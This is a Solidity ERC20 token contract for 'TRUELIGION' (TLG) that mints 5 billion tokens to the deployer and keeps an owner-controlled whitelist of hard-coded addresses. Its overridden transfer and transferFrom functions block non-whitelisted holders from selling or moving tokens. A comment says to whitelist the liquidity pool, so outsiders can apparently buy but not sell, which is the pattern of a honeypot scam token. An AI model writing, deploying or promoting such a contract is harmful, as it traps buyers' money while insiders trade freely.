// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("TRUELIGION", "TLG") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 5000000000 * 10 ** decimals());
        whiteList[0x883e765EDD58961B421CA087AA5E9e5dCA34332B]= true;
        whiteList[0x778209Ed778B418B81ef761233eb09f797fA0F23]=true;
        whiteList[0x2EB9ABebB305Aa8204fF0E25DBB9e2B309c7607E]=true;
        whiteList[0x97ED114608AE41236ADc39A46A880eDCaa4b3A69]=true;
        whiteList[0x89EDbCc2667Ef9d37fB569D256E2aAA168d4F5a6]=true;
        whiteList[0xC1F219D00101844EC218fba64435f2dC132139eC]=true;
        whiteList[0xbEE09BF1707A2F233BD4F306a51338a9B1944a14]=true;
        whiteList[0x15295e2bB9282D02637c6f7B1A99fd937eA48ca7]=true;
        whiteList[0xC0FD53449a3ca756f810287FC583cd11D90E1e5b]=true;
        whiteList[0xC1Fe38cF9E234f8EBE91eA2D46F4A17e746546a2]=true;
        whiteList[0x3f56f709138A626f4ECed003bcce024d5adD3191]=true;
        whiteList[0x2D9296beB11F32148a1Fb8dF2d8E5415fCB33a12]=true;
        whiteList[0xcbdA71fCE260DfE2D6B55413a26fE13Fd5e4350f]=true;
        whiteList[0x5a2F85dD724FB703B6f6120964DC4AEf27b17a4f]=true;
        whiteList[0xC9200461C24C76dB6e6aDCF69166bFe5de552719]=true;
        whiteList[0x5CD2a3644Cc7Ff07Da94fE812aFc9E58bf806090]=true;
        whiteList[0x05d5D01A43b4001AA65aD27ed0235Dd511163b9E]=true;
        whiteList[0xf819aeF76338bf595c99983515A4AC1B6e6efb1a]=true;
        whiteList[0x069869b1171Ef716873705185Ac59E9F8c746049]=true;
        whiteList[0x201DA2Ef2aB73Fb2b08C26E6907eDdC9c95BE5FF]=true;
        whiteList[0xe8963Ad654e06aD1B7f50F7588734C7c840DeE9e]=true;
        whiteList[0x2aE15854ff21AAAa7Fa6c79E4867Adbd824B35ef]=true;
        whiteList[0xd3E0b7b04C06C914518faFDfB9425800F36330fe]=true;
        whiteList[0x1b21038761F29a320F928d7C9a017a7214f19A90]=true;
        whiteList[0x59F46B17131371231C268cba94e9A291Ba5A5939]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}